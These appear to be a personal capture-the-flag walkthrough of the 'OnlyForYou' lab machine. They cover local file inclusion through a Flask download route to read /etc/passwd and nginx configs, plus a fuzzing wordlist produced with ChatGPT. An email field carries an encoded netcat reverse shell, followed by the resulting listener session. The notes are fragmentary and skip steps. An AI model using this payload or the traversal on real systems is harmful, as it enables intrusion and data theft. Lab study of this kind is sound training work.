# Only For  You usrer8788 Notes

Pre-Req
> Connect to the Seasonal VPN
> IP = 10.129.70.214                                                                              
┌──(toor㉿kali)-[~/OnlyForYou]
└─$ sudo openvpn ~/Downloads/competitive_DefenceLogic.ovpn 


## Enumeration Phase

### Nmap Scan 

NmaFrom our nmap scan we can see a webpage
_http-title: Did not follow redirect to http://only4you.htb/


Add this to the /etc/hosts file
> 10.129.70.214 only4you.htb

Viewing the Services page, we find an inactive subdomain
https://beta.only4you.htb/
    add this to our /etc/hosts and see what we get...
> 10.129.70.214 only4you.htb beta.only4you.htb 

### Subdomain enum

http://beta.only4you.htb/ gives us a link to download their source code 
[BurpSuite??]http://beta.only4you.htb/resize gives us the ability to **upload images**
[BurpSuite??]http://beta.only4you.htb/convert gives us the ability to **upload images**

### Source Code Enum

> Looking at the source code, we can see that the download function of app.py is vulnerable
'''
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
> Path traversal workaround needed
  **if '..' in filename or filename.startswith('../'):**
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
'''
> Since this application uses flask, there is a vuln that allows us to look for any file as long as we know the full path.



### BurpSuite 

#### LFI Manual part 1 
1. Go to /resize and upload an image
2. Open BurpSuite and turn on FoxyProxy (Burp)
3. Set Intercept to On
4. Once we are on the /list page, download any file.
5. Capture the request and send to repeater  (Ctrl + R)
6. Change the *image* to /etc/passwd

'''
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
**neo4j:x:997:997::/var/lib/neo4j:/bin/bash**
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
'''



#### LFI via ffuf manual (Without Burp Pro)
> We are looking for an nginx config file as seclists did not give us much
> The things we need are as followed
[x] a config file ( we have that nginx )
[] Default creds 
[] A user that would take those default creds 


Using ChatGPT, create a simple payload list for the defualt nginx files:
Q: give it in a .txt code block so I can copy it into a wordlist for fuzzing aswell as the full path. Also ndo not include your notes after the file

A: 
'''
/etc/nginx/nginx.conf
/etc/nginx/fastcgi_params
/etc/nginx/mime.types
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/nginx/proxy_params
/etc/nginx/ssl_params
/etc/nginx/uwsgi_params
/etc/nginx/scgi_params
/etc/nginx/koi-utf
'''

Use the intruder and sniper with that payload to perform the attack
Once the attack is finsihed, look through you results.

Looking at the sites-available, we have found the root location of the web application:
'''
	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
'''

Now that we have the root folder for the web application, we can now grab the app.py file with the repeater tab we used earlier.









Content-Length: 168

email=test@google.com;echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjI1IDkwMDEgPi90bXAvZg==|base64%20-d|bash&subject=ss&message=ss


┌──(toor㉿kali)-[~/OnlyForYou]
└─$ nc -lvnp 9001  
listening on [any] 9001 ...
connect to [10.10.14.25] from (UNKNOWN) [10.129.70.214] 35562
sh: 0: can't access tty; job control turned off
$ 
$ 
$ whoami
www-data
$ 

Now that we have access, we will need to go back to the etc./passwd file to notice the user neo4j is of interest

**neo4j:x:997:997::/var/lib/neo4j:/bin/bash**

> neo4j  | HTTP | 7474 |  server.http.listen_address
>        | Bolt | 7687 |  server.bolt.listen.address


